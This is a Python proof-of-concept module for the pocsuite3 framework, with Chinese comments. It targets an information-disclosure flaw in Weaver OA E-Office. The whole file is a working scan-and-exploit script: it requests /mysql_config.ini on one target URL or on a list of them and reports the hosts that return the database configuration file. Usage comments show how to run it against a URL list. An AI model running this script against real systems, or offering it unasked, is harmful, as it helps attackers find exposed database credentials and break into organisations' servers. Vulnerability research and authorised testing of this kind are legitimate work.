from collections import OrderedDict
import urllib.parse
import re
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY
from requests.api import patch


class POC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = ['luckying']  #  PoC作者的大名
    vulDate = '2021-11-02'  #漏洞公开的时间,不知道就写今天
    createDate = '2021-11-02'  # 编写 PoC 的日期
    updateDate = '2021-11-02'  # PoC 更新的时间,默认和编写时间一样
    references = ['']  # 漏洞地址来源,0day不用写
    name = '泛微OA E-Office mysql_config.ini 数据库信息漏洞'  # PoC 名称
    appPowerLink = ''  # 漏洞厂商主页地址
    appName = '泛微OA E-Office mysql_config.ini 数据库信息漏洞'  # 漏洞应用名称
    appVersion = ''''''  # 漏洞影响版本
    vulType = VUL_TYPE.ARBITRARY_FILE_READ  #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        泛微OA E-Office mysql_config.ini 数据库信息
    '''

  # 漏洞简要描述
    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify 
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE
    def _verify(self):
        result = {}
        vuln_url_1 = self.url + "/mysql_config.ini"
        headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
            }
        try:
            response_1 = requests.get(url=vuln_url_1, headers=headers, verify=False, timeout=10)
            if response_1.status_code == 200:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = vuln_url_1
            
        except Exception as e:
            return
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    
register_poc(POC)